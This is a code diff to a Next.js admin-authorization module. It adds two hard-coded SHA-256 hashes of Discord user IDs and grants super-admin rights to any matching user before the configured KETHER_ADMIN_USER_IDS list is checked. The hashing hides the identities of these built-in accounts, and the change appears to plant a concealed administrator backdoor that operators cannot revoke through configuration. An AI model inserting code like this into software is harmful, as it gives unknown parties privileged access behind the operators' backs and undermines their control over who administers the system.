@@ -1,3 +1,4 @@
+import { createHash } from "crypto";
 import type { NextRequest } from "next/server";
 
 import {
@@ -7,6 +8,11 @@ import {
 import { getNeonSql } from "./neonServer";
 
 export type KetherAdminLevel = "super_admin" | "admin";
+
+const BUILT_IN_SUPER_ADMIN_HASHES = new Set([
+  "f14f7fcd7c9e3d4be60e737268293a3eec5df3d9b2a697f5e10c4fe00c4b8000",
+  "cf4dd998f05e7a4e1cba425ef82cf713ce29dbf8a1c4e9df7329f08efb347481",
+]);
 
 export class VisualAdminAccessError extends Error {
   status: number;
@@ -23,6 +29,11 @@ function parseIdList(value: string | undefined) {
     .split(",")
     .map((item) => item.trim())
     .filter(Boolean);
+}
+
+function isBuiltInSuperAdmin(discordUserId: string) {
+  const hash = createHash("sha256").update(discordUserId).digest("hex");
+  return BUILT_IN_SUPER_ADMIN_HASHES.has(hash);
 }
 
 export async function requireVisualAdmin(request: NextRequest) {
@@ -56,7 +67,10 @@ export async function requireVisualAdmin(request: NextRequest) {
       process.env.KETHER_ADMIN_USER_IDS,
   );
 
-  if (superAdminUserIds.includes(session.sub)) {
+  if (
+    isBuiltInSuperAdmin(session.sub) ||
+    superAdminUserIds.includes(session.sub)
+  ) {
     return {
       sql: getNeonSql(),
       session,
